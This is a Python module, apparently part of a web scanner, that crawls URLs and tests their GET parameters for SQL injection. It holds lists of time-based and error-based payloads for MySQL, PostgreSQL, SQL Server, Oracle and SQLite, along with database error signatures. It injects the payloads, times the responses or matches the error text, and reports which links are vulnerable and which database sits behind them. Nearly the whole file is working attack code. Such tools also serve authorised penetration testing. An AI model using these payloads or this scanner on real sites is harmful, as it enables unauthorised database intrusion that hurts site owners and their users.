import requests
import time

from utils.objects.vuln_link import *
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from utils.ainsi import *
from utils.conf import *

db_error_signatures = {
        "MySQL": ["mysql_fetch_array", "warning: mysql", "supplied argument is not a valid mysql result", "mysql error", "you have an error in your sql syntax"],
        "PostgreSQL": ["postgresql error", "pg_query", "syntax error at or near", "error: syntax error"],
        "SQL Server": ["microsoft odbc driver for sql server", "sqlstate", "unclosed quotation mark", "incorrect syntax near", "sql server"],
        "Oracle": ["ora-00933", "ora-01722", "oracle error"],
        "SQLite": ["sqlite error", "near \"select\": syntax error"]
    }

time_based_payloads = {
        "MySQL": "' AND SLEEP(5)--",
        "PostgreSQL": "' AND pg_sleep(5)--",
        "SQL Server": "'; WAITFOR DELAY '0:0:5'--",
        "Oracle": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--"
    }

error_based_db_payloads = {
        "MySQL": ["' AND 1=CONVERT(int,(SELECT @@version))--", "' AND 1=BENCHMARK(1000000,MD5(1))--"],
        "PostgreSQL": ["' AND 1=(SELECT CAST(version() AS INT))--", "' AND 1=CAST((SELECT version()) AS INT)--"],
        "SQL Server": ["' AND 1=CONVERT(int,(SELECT @@version))--", "'; SELECT CAST(@@version AS INT);--"],
        "Oracle": ["' AND 1=(SELECT TO_NUMBER('a') FROM DUAL)--", "' AND 1=UTL_INADDR.GET_HOST_ADDRESS(('a'))--"],
        "SQLite": ["' AND 1=ABS(CAST(SQLITE_VERSION() AS INTEGER))--"]
    }   
        

def identify_db_get(scrapped_data):
    print(f"🔴 {colored('Detection:', RED, styles=BOLD)} {colored('GET Method', CYAN, styles=BOLD)}")
    success = False
    identified_db = None    
    vuln_links = set()
    
    for url in scrapped_data:
        success, identified_db, detection, query_params = check_sql_injection_get(url)
        
        if success:
            print(f"{colored('🟡 Detection:', YELLOW, styles=BOLD)} {colored(url, GREEN, styles=BLINK)} > {colored(identified_db, MAGENTA, styles=BOLD)}")
            vuln_links.add(vuln_link(identified_db, url, query_params, success))
        else:
            print(f"{colored('🟡 Detection:', YELLOW, styles=BOLD)} {colored(url, RED, styles=STRIKETHROUGH)}")
        time.sleep(requested_delay)
    
    print(erase_lines(len(scrapped_data) + 3))
    for vuln_link_obj in vuln_links:
        url, identified_db, query_params, success = vuln_link_obj.get_infos()
        print(f"{colored('🟢 Detection:', WHITE, styles=BOLD)} {colored(url, GREEN, styles=BLINK)} > {colored(identified_db, MAGENTA, styles=BOLD)} - {colored(detection, CYAN, styles=BOLD)}")
    print()
    return vuln_links

def check_sql_injection_get(url):
    success = False
    identify_db = None
    
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    try:
        response = requests.get(url, timeout=10)
        
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Erreur lors de la requête originale : {e}")
        return success, identify_db, None, None

    detection = None
    for param, values in query_params.items():
        original_value = values[0]
        
        success, identify_db, detection = time_based_injection_get(query_params, param, original_value, parsed_url)
        if not success:
            success, identify_db, detection = error_based_injection_get(query_params, param, original_value, parsed_url)
        if success:
            break

    return success, identify_db, detection, query_params

def error_based_injection_get(query_params, param, original_value, parsed_url):
    for db_type, payloads in error_based_db_payloads.items():
        for payload in payloads:
            temp_params = query_params.copy()
            temp_params[param] = [original_value + payload]
            test_url = urlunparse(parsed_url._replace(query=urlencode(temp_params, doseq=True)))

            try:
                response = requests.get(test_url, timeout=10)
                response_text_lower = response.text.lower()
                
                for signature in db_error_signatures.get(db_type, []):
                    if signature in response_text_lower:
                        return True, db_type, "error-based"
            except requests.exceptions.RequestException:
                pass
            except Exception as e:
                print(f"    Une erreur inattendue s'est produite: {e}")
    return False, None, None

def time_based_injection_get(query_params, param, original_value, parsed_url):
    for db_type, payload in time_based_payloads.items():
        temp_params = query_params.copy()
        temp_params[param] = [original_value + payload]
        test_url = urlunparse(parsed_url._replace(query=urlencode(temp_params, doseq=True)))

        try:
            start_time = time.time()
            requests.get(test_url, timeout=15)
            end_time = time.time()
            
            if (end_time - start_time) > 4:
                return True, db_type, "time-based"
        except requests.exceptions.RequestException as e:
            pass
        except Exception as e:
            print(f"    Une erreur inattendue s'est produite: {e}")
    return False, None, None
